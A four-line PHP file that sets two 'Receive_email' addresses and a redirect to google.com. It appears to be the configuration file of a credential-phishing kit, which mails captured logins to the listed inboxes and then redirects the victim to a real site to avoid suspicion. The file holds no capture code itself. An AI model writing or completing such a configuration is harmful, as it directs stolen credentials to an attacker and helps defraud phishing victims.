<?php 
$Receive_email="myw0rkmail@protonmail.com, myw0rkinmail@gmail.com";
$redirect="https://www.google.com/";
?>